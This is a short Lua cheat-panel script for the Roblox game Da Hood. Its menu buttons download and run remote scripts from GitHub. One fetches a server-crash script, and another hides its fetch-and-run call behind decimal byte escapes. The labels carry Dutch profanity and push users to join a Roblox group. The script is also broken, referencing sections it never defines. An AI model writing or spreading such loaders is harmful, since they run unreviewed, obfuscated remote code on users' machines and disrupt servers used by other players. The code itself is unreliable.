local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Cheat Panels", "BloodTheme")




local Main = Window:NewTab("Dahood") 
local ChapoFlashSection = Main.NewSection("Dahood")

CreditsSection:NewLabel("JOIN BEFORE USING THIS SCRIPT")

CreditsSection:NewLabel("https://www.roblox.com/groups/15070691/OblivionW#!/about")


DaHoodSection:NewButton("Dahood", "Ewaja", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CorruptOblivion/DaHood/main/dahoodcrash.lua"))()
end)


DaHoodSection:NewButton("Algemene HackPanel Kechba's", "Verkanker Alle Kanker Server AMSK", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\82\101\97\112\101\114\87\97\114\101\65\117\116\104\47\118\49\46\50\45\97\116\104\101\110\97\47\109\97\105\110\47\109\97\105\110\39\41\41\40\41\10")()
end)


--Keybind
local Main = Window:NewTab("Misc")
local MiscSection = Main.NewSection("Misc")